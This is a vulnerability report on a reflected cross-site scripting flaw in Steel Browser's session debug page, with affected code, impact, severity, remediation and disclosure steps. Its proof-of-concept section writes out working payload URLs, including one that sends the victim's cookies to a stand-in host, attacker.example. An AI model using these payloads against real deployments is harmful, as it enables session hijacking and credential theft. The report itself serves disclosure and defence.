# Security Report — Reflected XSS in Steel Browser session debug view (`/v1/sessions/debug`)

**Status:** Candidate finding — pending dedup against existing advisories and maintainer confirmation.
**Reporter:** External security research (CodeQL-assisted triage).
**Project:** [steel-dev/steel-browser](https://github.com/steel-dev/steel-browser)
**Analyzed:** current `main` (public), confirmed live at time of writing (2026-11-06).
**Class:** Reflected Cross-Site Scripting (CWE-79)
**Component:** `api/src/modules/sessions/sessions.controller.ts` → `api/src/templates/live-session-streamer.ejs`

---

## Summary

The session "live debugger" page reflects the `interactive` query-string parameter into an
inline `<script>` block via an EJS `<%= %>` interpolation. EJS `<%= %>` HTML-escapes
`< > & ' "`, but the value is emitted into a **JavaScript context**, not an HTML context, and
the characters that matter there (`;`, `(`, `)`, `.`, `/`, spaces, back-ticks) are **not**
escaped. An attacker-supplied value therefore breaks out of the intended numeric assignment
and executes arbitrary JavaScript in the Steel Browser web origin when a victim opens a
crafted link.

---

## Affected code

### Sink — `api/src/templates/live-session-streamer.ejs:520-521`

```html
<script>
(function() {
      // Global flag for single page mode
      const singlePageMode = <%= singlePageMode %>;
      const interactive = <%= interactive %>;   // <-- reflected into JS context
```

### Source — `api/src/modules/sessions/sessions.controller.ts:147-166`

```ts
export const handleGetSessionStream = async (server, request, reply) => {
  const { showControls, theme, interactive, pageId, pageIndex } = request.query;  // raw query
  const singlePageMode = !!(pageId || pageIndex);                                  // boolean (safe)
  ...
  return reply.view("live-session-streamer.ejs", {
    wsUrl, showControls, theme,
    interactive,          // <-- passed through unvalidated
    dimensions: server.sessionService.activeSession.dimensions,
    singlePageMode,
  });
};
```

### Route — `api/src/modules/sessions/sessions.routes.ts`

`GET /sessions/debug` (under the `/v1` API prefix) →
*"Returns an HTML page with a live debugger view of the session"* → `handleGetSessionStream`.
`interactive` is a `querystring` field with no enum/validation that narrows it to a safe set.

**Note on the other reflected values:**
- `singlePageMode` is `!!(pageId || pageIndex)` → always the literal `true`/`false`. **Safe.**
- `theme` is reflected at line 2 as `<html data-theme="<%= theme %>">` — an HTML
  **attribute** in double quotes, where `<%= %>`'s escaping of `"` is sufficient. **Safe.**
- `interactive` is the one injectable sink, because its context is raw JavaScript.

---

## Why HTML-escaping does not help here (and what the PoC must avoid)

Inside a `<script>` element, the HTML parser treats the content as raw text and does **not**
decode HTML entities. So EJS turning `'` into `&#39;` does not yield a quote in JS — it yields
the literal characters `&#39;` (a syntax error). The practical consequences:

- A payload **cannot use** `'  "  <  >  &` (they get entity-escaped and break the JS).
- A payload **can freely use** `;  (  )  .  /  space` and **back-ticks** `` ` `` with `${}`,
  none of which `<%= %>` escapes.

That is enough for arbitrary script execution and for data exfiltration.

---

## Proof of concept

Assuming a reachable Steel Browser API (default service port, `/v1` prefix):

**Minimal (alert):**
```
GET /v1/sessions/debug?interactive=0;alert(document.domain)//
```
Renders as:
```js
const interactive = 0;alert(document.domain)//;
```
→ `const interactive = 0;` assigns, then `alert(document.domain)` executes, then `//` comments
out the template's trailing `;`.

**Cookie/data exfiltration (quote-free, uses a back-tick template literal):**
```
GET /v1/sessions/debug?interactive=0;fetch(`//attacker.example/?c=${document.cookie}`)//
```
URL-encoded:
```
/v1/sessions/debug?interactive=0%3Bfetch(%60//attacker.example/%3Fc%3D%24%7Bdocument.cookie%7D%60)%2F%2F
```

Delivery is a single crafted link the victim opens (the endpoint is `GET`), or an auto-firing
`<img>`/`fetch` from any page if the viewer's browser can reach the server.

---

## Impact

Arbitrary JavaScript execution in the Steel Browser web origin (the session debug/viewer UI).
Depending on deployment that enables: theft of any session/auth tokens or cookies scoped to
that origin, hijacking or manipulating the live browser-session view, and pivoting via any
same-origin API the UI can call. Steel Browser is a browser-automation service; the debug view
is a web page intended to be opened by operators, which is exactly the clickable surface a
reflected XSS needs.

**Severity (provisional):** reflected XSS, requires victim to open a link →
`CVSS AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N` ≈ **6.1 (Medium)**. Higher if the origin holds
sensitive session credentials or if the endpoint is unauthenticated.

---

## Root cause

Interpolating request data into a JavaScript context with an **HTML**-escaping template
primitive (`<%= %>`). HTML escaping is the wrong (insufficient) encoding for a `<script>`
context.

## Remediation

- **Serialize as data, not code.** Emit the value with a JS/JSON-safe encoding, e.g.
  `const interactive = <%- JSON.stringify(Boolean(interactive)) %>;` — or, since it is meant
  to be a boolean, coerce it in the controller (`interactive: interactive === 'true'`) and let
  the template print a real boolean.
- **Validate at the edge.** The querystring schema should constrain `interactive` (and
  `theme`, `showControls`) to a known set (`boolean` / enum) rather than free text.
- **Defense in depth.** A `Content-Security-Policy` without `unsafe-inline` on this page would
  neutralize inline-script injection; the page currently relies on inline `<script>`.

---

## Dedup / before filing

- [ ] Check Steel Browser's GitHub Security Advisories / CVE list — may already be reported or
      fixed (this analysis is on current `main`, which still reflects the value unescaped).
- [ ] Confirm the exact prefix (`/v1`) and default port against a running instance, and whether
      `/v1/sessions/debug` requires authentication in the target deployment.
- [ ] Report privately via the project's security policy / GitHub "Report a vulnerability".
